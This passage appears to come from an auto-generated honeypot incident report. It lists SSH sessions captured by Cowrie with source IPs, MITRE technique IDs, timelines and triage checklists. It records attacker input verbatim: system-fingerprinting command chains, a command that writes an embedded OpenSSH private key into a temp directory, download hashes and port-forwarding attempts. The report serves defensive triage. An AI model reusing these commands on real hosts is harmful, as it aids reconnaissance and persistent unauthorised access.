**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:11:31` | `cowrie.session.connect` |
| `2026-08-15 00:11:31` | `cowrie.client.version` |
| `2026-08-15 00:11:31` | `cowrie.client.kex` |
| `2026-08-15 00:11:32` | `cowrie.login.success` |
| `2026-08-15 00:11:33` | `cowrie.session.params` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.success` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:33` | `cowrie.command.input` |
| `2026-08-15 00:11:34` | `cowrie.log.closed` |
| `2026-08-15 00:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a45c9e6d55

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:17` | `cowrie.session.connect` |
| `2026-08-15 00:13:17` | `cowrie.client.version` |
| `2026-08-15 00:13:18` | `cowrie.client.kex` |
| `2026-08-15 00:13:18` | `cowrie.login.success` |
| `2026-08-15 00:13:18` | `cowrie.session.params` |
| `2026-08-15 00:13:18` | `cowrie.command.input` |
| `2026-08-15 00:13:19` | `cowrie.log.closed` |
| `2026-08-15 00:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53cd5bc7853

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:22` | `cowrie.session.connect` |
| `2026-08-15 00:13:22` | `cowrie.client.version` |
| `2026-08-15 00:13:22` | `cowrie.client.kex` |
| `2026-08-15 00:13:22` | `cowrie.login.success` |
| `2026-08-15 00:13:23` | `cowrie.session.params` |
| `2026-08-15 00:13:23` | `cowrie.command.input` |
| `2026-08-15 00:13:23` | `cowrie.log.closed` |
| `2026-08-15 00:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fc76965c1bf

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:26` | `cowrie.session.connect` |
| `2026-08-15 00:13:26` | `cowrie.client.version` |
| `2026-08-15 00:13:26` | `cowrie.client.kex` |
| `2026-08-15 00:13:26` | `cowrie.login.success` |
| `2026-08-15 00:13:27` | `cowrie.session.params` |
| `2026-08-15 00:13:27` | `cowrie.command.input` |
| `2026-08-15 00:13:27` | `cowrie.log.closed` |
| `2026-08-15 00:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-304e17ec7ab9

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:30` | `cowrie.session.connect` |
| `2026-08-15 00:13:30` | `cowrie.client.version` |
| `2026-08-15 00:13:30` | `cowrie.client.kex` |
| `2026-08-15 00:13:30` | `cowrie.login.success` |
| `2026-08-15 00:13:31` | `cowrie.session.params` |
| `2026-08-15 00:13:31` | `cowrie.command.input` |
| `2026-08-15 00:13:31` | `cowrie.log.closed` |
| `2026-08-15 00:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db3f7ab5c1b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:34` | `cowrie.session.connect` |
| `2026-08-15 00:13:34` | `cowrie.client.version` |
| `2026-08-15 00:13:34` | `cowrie.client.kex` |
| `2026-08-15 00:13:36` | `cowrie.login.success` |
| `2026-08-15 00:13:39` | `cowrie.session.params` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.success` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.log.closed` |
| `2026-08-15 00:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c97f69e17ce8

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:34` | `cowrie.session.connect` |
| `2026-08-15 00:13:34` | `cowrie.client.version` |
| `2026-08-15 00:13:34` | `cowrie.client.kex` |
| `2026-08-15 00:13:35` | `cowrie.login.success` |
| `2026-08-15 00:13:36` | `cowrie.session.params` |
| `2026-08-15 00:13:36` | `cowrie.command.input` |
| `2026-08-15 00:13:36` | `cowrie.log.closed` |
| `2026-08-15 00:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d687c2880e3b

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:36` | `cowrie.session.connect` |
| `2026-08-15 00:13:36` | `cowrie.client.version` |
| `2026-08-15 00:13:36` | `cowrie.client.kex` |
| `2026-08-15 00:13:36` | `cowrie.login.success` |
| `2026-08-15 00:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c459b9ad64

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:36` | `cowrie.session.connect` |
| `2026-08-15 00:13:36` | `cowrie.client.version` |
| `2026-08-15 00:13:36` | `cowrie.client.kex` |
| `2026-08-15 00:13:36` | `cowrie.login.success` |
| `2026-08-15 00:13:38` | `cowrie.session.params` |
| `2026-08-15 00:13:38` | `cowrie.command.input` |
| `2026-08-15 00:13:39` | `cowrie.session.file_download` |
| `2026-08-15 00:13:39` | `cowrie.session.file_download` |
| `2026-08-15 00:13:39` | `cowrie.log.closed` |
| `2026-08-15 00:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5439037b49fc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:39` | `cowrie.session.connect` |
| `2026-08-15 00:13:39` | `cowrie.client.version` |
| `2026-08-15 00:13:39` | `cowrie.client.kex` |
| `2026-08-15 00:13:39` | `cowrie.login.success` |
| `2026-08-15 00:13:40` | `cowrie.session.params` |
| `2026-08-15 00:13:40` | `cowrie.command.input` |
| `2026-08-15 00:13:40` | `cowrie.log.closed` |
| `2026-08-15 00:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d908203c3249

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:43` | `cowrie.session.connect` |
| `2026-08-15 00:13:43` | `cowrie.client.version` |
| `2026-08-15 00:13:43` | `cowrie.client.kex` |
| `2026-08-15 00:13:43` | `cowrie.login.success` |
| `2026-08-15 00:13:44` | `cowrie.session.params` |
| `2026-08-15 00:13:44` | `cowrie.command.input` |
| `2026-08-15 00:13:44` | `cowrie.log.closed` |
| `2026-08-15 00:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724cd2289799

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:47` | `cowrie.session.connect` |
| `2026-08-15 00:13:47` | `cowrie.client.version` |
| `2026-08-15 00:13:47` | `cowrie.client.kex` |
| `2026-08-15 00:13:47` | `cowrie.login.success` |
| `2026-08-15 00:13:48` | `cowrie.session.params` |
| `2026-08-15 00:13:48` | `cowrie.command.input` |
| `2026-08-15 00:13:48` | `cowrie.log.closed` |
| `2026-08-15 00:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3834fe773f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:50` | `cowrie.session.connect` |
| `2026-08-15 00:13:50` | `cowrie.client.version` |
| `2026-08-15 00:13:51` | `cowrie.client.kex` |
| `2026-08-15 00:13:51` | `cowrie.login.success` |
| `2026-08-15 00:13:52` | `cowrie.session.params` |
| `2026-08-15 00:13:52` | `cowrie.command.input` |
| `2026-08-15 00:13:52` | `cowrie.log.closed` |
| `2026-08-15 00:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77bb9dccf6e1

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:55` | `cowrie.session.connect` |
| `2026-08-15 00:13:55` | `cowrie.client.version` |
| `2026-08-15 00:13:55` | `cowrie.client.kex` |
| `2026-08-15 00:13:55` | `cowrie.login.success` |
| `2026-08-15 00:13:56` | `cowrie.session.params` |
| `2026-08-15 00:13:56` | `cowrie.command.input` |
| `2026-08-15 00:13:56` | `cowrie.log.closed` |
| `2026-08-15 00:13:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ff5885a8052

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:13 |
| **Last Seen** | 2026-08-15 00:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:13:59` | `cowrie.session.connect` |
| `2026-08-15 00:13:59` | `cowrie.client.version` |
| `2026-08-15 00:13:59` | `cowrie.client.kex` |
| `2026-08-15 00:13:59` | `cowrie.login.success` |
| `2026-08-15 00:14:00` | `cowrie.session.params` |
| `2026-08-15 00:14:00` | `cowrie.command.input` |
| `2026-08-15 00:14:00` | `cowrie.log.closed` |
| `2026-08-15 00:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a998f26b858d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:14 |
| **Last Seen** | 2026-08-15 00:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:14:03` | `cowrie.session.connect` |
| `2026-08-15 00:14:03` | `cowrie.client.version` |
| `2026-08-15 00:14:03` | `cowrie.client.kex` |
| `2026-08-15 00:14:04` | `cowrie.login.success` |
| `2026-08-15 00:14:04` | `cowrie.session.params` |
| `2026-08-15 00:14:04` | `cowrie.command.input` |
| `2026-08-15 00:14:04` | `cowrie.log.closed` |
| `2026-08-15 00:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d8b117b178

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-08-15 00:14 |
| **Last Seen** | 2026-08-15 00:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:14:07` | `cowrie.session.connect` |
| `2026-08-15 00:14:07` | `cowrie.client.version` |
| `2026-08-15 00:14:08` | `cowrie.client.kex` |
| `2026-08-15 00:14:08` | `cowrie.login.success` |
| `2026-08-15 00:14:09` | `cowrie.session.params` |
| `2026-08-15 00:14:09` | `cowrie.command.input` |
| `2026-08-15 00:14:09` | `cowrie.log.closed` |
| `2026-08-15 00:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5aea5c2c7ad

| Field | Detail |
|---|---|
| **Source IP** | `223.197.153[.]135` |
| **First Seen** | 2026-08-15 00:14 |
| **Last Seen** | 2026-08-15 00:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:14:32` | `cowrie.session.connect` |
| `2026-08-15 00:14:32` | `cowrie.client.version` |
| `2026-08-15 00:14:32` | `cowrie.client.kex` |
| `2026-08-15 00:14:34` | `cowrie.login.success` |
| `2026-08-15 00:14:35` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.153[.]135` to AbuseIPDB if not already reported
- [ ] Block `223.197.153[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b948c88d701a

| Field | Detail |
|---|---|
| **Source IP** | `220.246.42[.]227` |
| **First Seen** | 2026-08-15 00:14 |
| **Last Seen** | 2026-08-15 00:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:14:40` | `cowrie.session.connect` |
| `2026-08-15 00:14:41` | `cowrie.client.version` |
| `2026-08-15 00:14:41` | `cowrie.client.kex` |
| `2026-08-15 00:14:42` | `cowrie.login.success` |
| `2026-08-15 00:14:43` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `220.246.42[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f835eac590b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:15 |
| **Last Seen** | 2026-08-15 00:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:15:35` | `cowrie.session.connect` |
| `2026-08-15 00:15:35` | `cowrie.client.version` |
| `2026-08-15 00:15:35` | `cowrie.client.kex` |
| `2026-08-15 00:15:36` | `cowrie.login.success` |
| `2026-08-15 00:15:38` | `cowrie.session.params` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.success` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.command.input` |
| `2026-08-15 00:15:38` | `cowrie.log.closed` |
| `2026-08-15 00:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626dd24de423

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:17 |
| **Last Seen** | 2026-08-15 00:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:17:41` | `cowrie.session.connect` |
| `2026-08-15 00:17:41` | `cowrie.client.version` |
| `2026-08-15 00:17:41` | `cowrie.client.kex` |
| `2026-08-15 00:17:42` | `cowrie.login.success` |
| `2026-08-15 00:17:44` | `cowrie.session.params` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.success` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.command.input` |
| `2026-08-15 00:17:44` | `cowrie.log.closed` |
| `2026-08-15 00:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73a644fdb4fd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:19 |
| **Last Seen** | 2026-08-15 00:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
